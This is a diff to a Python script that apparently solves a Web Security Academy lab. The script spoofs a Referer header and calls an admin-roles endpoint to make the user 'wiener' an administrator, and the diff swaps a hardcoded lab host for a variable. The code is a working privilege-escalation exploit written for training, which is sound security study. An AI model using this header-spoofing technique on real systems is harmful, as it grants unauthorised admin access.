@@ -9,8 +9,8 @@ def login(url, session):
 
 
 def upgrade_privileges(url, session):
-    headers = {"Referer": "https://0a7a006a047e112083fa870900ad00f6.web-security-academy.net/admin", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"}
-    response = session.get(f"{url}/admin-roles?username=carlos&action=upgrade", headers=headers, timeout=10)
+    headers = {"Referer": f"{url}/admin", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"}
+    response = session.get(f"{url}/admin-roles?username=wiener&action=upgrade", headers=headers, timeout=10)
     return "wiener (ADMIN)" in response.text
 
 
